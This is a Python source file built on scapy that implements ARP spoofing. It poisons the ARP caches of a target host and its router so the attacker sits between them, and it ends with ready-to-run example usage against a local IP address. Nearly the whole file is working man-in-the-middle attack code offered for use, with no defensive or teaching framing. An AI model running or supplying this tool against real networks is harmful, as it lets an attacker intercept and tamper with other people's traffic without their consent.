import os
import scapy.all as scapy
import threading
import logging
import time

class ArpSpoof:
    @staticmethod
    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc

    @staticmethod
    def spoof(ip_who_am, mac_address_who_i_am, who_i_tell):
        packet = scapy.ARP(op=2, pdst=ip_who_am, hwdst=mac_address_who_i_am, psrc=who_i_tell)
        scapy.send(packet, verbose=False)

    @staticmethod
    def man_in_the_middle(target_ip, router_ip, filepath, force_get_mac_address=False):
        ArpSpoof.create_control_file(filepath)
        target_mac = None
        router_mac = None
        packets_sent = 0
        try:
            while os.path.exists(filepath):
                if force_get_mac_address or not target_mac or not router_mac:
                    target_mac = ArpSpoof.get_mac(target_ip)
                    router_mac = ArpSpoof.get_mac(router_ip)
                ArpSpoof.spoof(target_ip, target_mac, router_ip)  # tell the router I am the target
                ArpSpoof.spoof(router_ip, router_mac, target_ip)  # tell the target I am the router
                packets_sent += 2
                logging.info(f"Packets sent: {packets_sent}")
                time.sleep(1)
        except Exception as e:
            print(f'ERROR in mim with ip {target_ip} : ' + str(e))
            ArpSpoof.man_in_the_middle(target_ip, router_ip, filepath, force_get_mac_address=False)

    @staticmethod
    def create_control_file(filepath):
        if not os.path.exists(filepath):
            open(filepath, 'w').close()
            logging.info(f"Control file {filepath} created.")
    @staticmethod
    def delete_control_file(filepath):
        if os.path.exists(filepath):
            os.remove(filepath)
            logging.info(f"Control file {filepath} deleted.")

    @staticmethod
    def main_mim(router_ip, target_ip):
        os.makedirs('threads', exist_ok=True)
        name_watcher = f"{target_ip}_arp_spoof"
        control_file_path = f"threads/{name_watcher}_control"

        thread = threading.Thread(
            target=ArpSpoof.man_in_the_middle, args=(
                target_ip, router_ip, control_file_path, 'false'), name="MITMThread")
        thread.start()

    @staticmethod
    def stop_mim(target_ip):
        name_watcher = f"{target_ip}_arp_spoof"
        control_file_path = f"threads/{name_watcher}_control"
        ArpSpoof.delete_control_file(control_file_path)

# Example usage
if __name__ == "__main__":
    target_ip = "192.168.1.226"  # Target IP address
    router_ip = "192.168.1.1"  # Router IP address

    os.makedirs('threads', exist_ok=True)
    name_watcher = f"{target_ip}_arp_spoof"
    control_file_path = f"threads/{name_watcher}_control"

    thread = threading.Thread(target=ArpSpoof.man_in_the_middle, args=(target_ip, router_ip, control_file_path, 'false'), name="MITMThread")
    thread.start()
